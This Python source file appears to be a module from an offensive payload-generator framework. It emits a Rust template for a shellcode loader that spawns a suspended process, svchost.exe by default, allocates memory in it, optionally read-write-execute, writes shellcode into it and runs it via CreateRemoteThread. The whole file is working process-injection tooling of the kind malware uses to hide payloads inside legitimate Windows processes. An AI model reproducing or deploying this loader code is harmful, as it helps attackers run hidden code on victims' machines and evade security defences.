from string import Template

class spawnandinject:
    def __init__(self, arguments):
        self.memoryPermission = 'PAGE_EXECUTE_READ'
        self.target = 'C:\\\\windows\\\\system32\\\\svchost.exe'
        if 'perm' in arguments:
            if arguments['perm'] == 'rwx':
                self.memoryPermission = 'PAGE_EXECUTE_READWRITE'
        if 'target' in arguments:
            self.target = arguments['target'].replace('\\','\\\\')

    def imports(self) -> list[str]:
        return ['extern crate windows_sys;', 
                'use windows_sys::Win32::System::Memory::VirtualAllocEx;',
                'use windows_sys::Win32::System::Memory::MEM_COMMIT;',
                'use windows_sys::Win32::System::Memory::MEM_RESERVE;',
                'use windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory;',
                'use windows_sys::Win32::System::Threading::CreateProcessA;',
                'use windows_sys::Win32::System::Threading::STARTUPINFOA;',
                'use windows_sys::Win32::System::Threading::PROCESS_INFORMATION;',
                'use windows_sys::Win32::System::Threading::CREATE_SUSPENDED;',
                f'use windows_sys::Win32::System::Memory::{self.memoryPermission};',
                'use windows_sys::Win32::System::Threading::CreateRemoteThread;',
                'use windows_sys::Win32::System::Threading::WaitForSingleObject;'
                'use std::ffi::CString;',
                'use core::ffi::c_void;',
                'use std::ptr;',
                ]

    def compilerOptions(self) -> list[str]:
        return ['windows-sys = { version = "0.61.2", features = ["Win32_System_Memory", "Win32_System_Threading", "Win32_Security", "Win32_Foundation", "Win32_System_Diagnostics_Debug", "Win32_System_Kernel", "Wdk_System", "Wdk_System_Threading"] }']

    def codeblocks(self) -> str:
        return ''

    def apicalls(self) -> list[str]:
        return []

    def template(self) -> str:
        return Template("""
    {transformers}

    unsafe
    {{

        let name = CString::new("$target").unwrap();

        let lpstartupinfo = STARTUPINFOA {{
            cb: std::mem::size_of::<STARTUPINFOA>() as u32,
            ..Default::default()
        }};
        let mut lpprocessinformation = PROCESS_INFORMATION::default();


        let _ = CreateProcessA(
            ptr::null_mut(),
            name.as_ptr() as *mut u8, 
            ptr::null_mut(), 
            ptr::null_mut(), 
            0, 
            CREATE_SUSPENDED, 
            ptr::null_mut(), 
            ptr::null_mut(), 
            &lpstartupinfo as *const STARTUPINFOA, 
            &mut lpprocessinformation as *mut PROCESS_INFORMATION,
            );
        
        let lpbuffer: *mut c_void = std::mem::transmute(shellcode.as_ptr());
        
        let addr = VirtualAllocEx(
            (lpprocessinformation).hProcess, 
            std::ptr::null(), 
            shellcode.len() as usize, 
            MEM_COMMIT | MEM_RESERVE, 
            $memoryPermission);

        let _ = WriteProcessMemory(
            (lpprocessinformation).hProcess, 
            addr, 
            lpbuffer, 
            shellcode.len() as usize, 
            ptr::null_mut());

        let thread = CreateRemoteThread(
            (lpprocessinformation).hProcess, 
            ptr::null_mut(), 
            0, 
            Some(std::mem::transmute(addr)), 
            ptr::null_mut(),
            0,
            ptr::null_mut());
            
        WaitForSingleObject(thread, 500);
    
    }}
""").substitute(target=self.target, memoryPermission=self.memoryPermission)